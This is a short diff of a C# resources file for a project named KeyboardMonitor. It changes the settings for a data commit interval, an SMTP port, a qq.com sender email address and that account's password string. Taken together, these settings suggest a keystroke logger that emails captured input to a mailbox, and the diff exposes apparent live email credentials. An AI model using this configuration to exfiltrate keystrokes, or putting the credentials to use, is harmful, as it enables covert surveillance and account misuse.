@@ -61,7 +61,7 @@ namespace KeyboardMonitor.Properties {
         }
         
         /// <summary>
-        ///   查找类似 300000 的本地化字符串。
+        ///   查找类似 30000 的本地化字符串。
         /// </summary>
         internal static string CommitDataInterval {
             get {
@@ -88,7 +88,7 @@ namespace KeyboardMonitor.Properties {
         }
         
         /// <summary>
-        ///   查找类似 465 的本地化字符串。
+        ///   查找类似 25 的本地化字符串。
         /// </summary>
         internal static string EmailServicePort {
             get {
@@ -107,7 +107,7 @@ namespace KeyboardMonitor.Properties {
         }
         
         /// <summary>
-        ///   查找类似 2646016915@qq.com 的本地化字符串。
+        ///   查找类似 383763320@qq.com 的本地化字符串。
         /// </summary>
         internal static string FormDataEmail {
             get {
@@ -116,7 +116,7 @@ namespace KeyboardMonitor.Properties {
         }
         
         /// <summary>
-        ///   查找类似 xXx383763320 的本地化字符串。
+        ///   查找类似 hnlklpxftpzdcbec 的本地化字符串。
         /// </summary>
         internal static string FormDataEmailPassword {
             get {
